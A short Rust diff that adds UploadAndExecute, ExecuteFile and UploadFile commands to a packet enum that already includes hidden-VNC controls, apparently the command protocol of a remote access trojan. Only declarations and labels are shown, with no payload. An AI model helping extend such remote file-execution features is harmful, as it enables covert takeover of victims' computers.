@@ -122,6 +122,10 @@ pub enum ClientboundPacket {
     StartHVNC,
     StopHVNC,
     OpenExplorer,
+    
+    UploadAndExecute(FileData),
+    ExecuteFile(String),
+    UploadFile(String, FileData),
 }
 
 impl Packet for ClientboundPacket {
@@ -173,6 +177,9 @@ impl Packet for ClientboundPacket {
             ClientboundPacket::StartHVNC => "Start HVNC",
             ClientboundPacket::StopHVNC => "Stop HVNC",
             ClientboundPacket::OpenExplorer => "Open Explorer",
+            ClientboundPacket::UploadAndExecute(_) => "Upload And Execute",
+            ClientboundPacket::ExecuteFile(_) => "Execute File",
+            ClientboundPacket::UploadFile(_, _) => "Upload File",
         }
     }
 }
